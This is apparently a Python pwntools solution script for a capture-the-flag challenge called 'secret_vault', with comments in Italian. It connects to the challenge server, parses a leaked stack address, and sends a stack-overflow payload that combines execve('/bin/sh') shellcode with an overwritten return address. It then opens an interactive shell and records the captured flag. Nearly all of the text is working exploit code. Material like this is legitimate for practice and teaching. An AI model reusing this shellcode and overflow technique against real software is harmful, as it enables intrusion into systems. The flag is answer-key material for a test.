#! /usr/bin/env python3

from pwn import *

# setup
processo = ELF('./secret_vault')
# conn = process(processo.path)
conn = remote('vault.challs.olicyber.it', 10006)
# key = subprocess.run(['./get_key'], stdout=subprocess.PIPE).stdout
# key =  bytes.fromhex(hex(int(key))[2:])
# print(key)

# def xorShell(shell, chiave):
#     # chiave = chiave * 16
#     chiave = chiave[-1:] * len(shell)
#     return bytes([x ^ y for x,y in zip(shell, chiave)])

# context.terminal = ['terminator', '-e']
# gdb.attach(conn, gdbscript='''
# b *0x004014a4
# c
# ''')

def recv_and_send(stringa):
    conn.recvuntil('>')
    conn.sendline(stringa)

# exploi
recv_and_send('1\n')

conn.recvuntil('Messaggio criptato correttamente in ')
stack = conn.recvline().strip()[2:-1].decode()
print(stack)
stack = p64(int(stack,16))

recv_and_send('1')

shell = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
# payload = b'A'*10 + b'\x00'*78 + stack
payload = shell + b'\x00'*61 + stack
conn.sendline(payload)

recv_and_send('2')
conn.recvline() # decriptazione in corso
conn.recvline() # decriptazione in corso
output = conn.recvline()

print(output)

recv_and_send('3')
conn.interactive()

# flag{pr3tty_3asy_1snt_1t?}


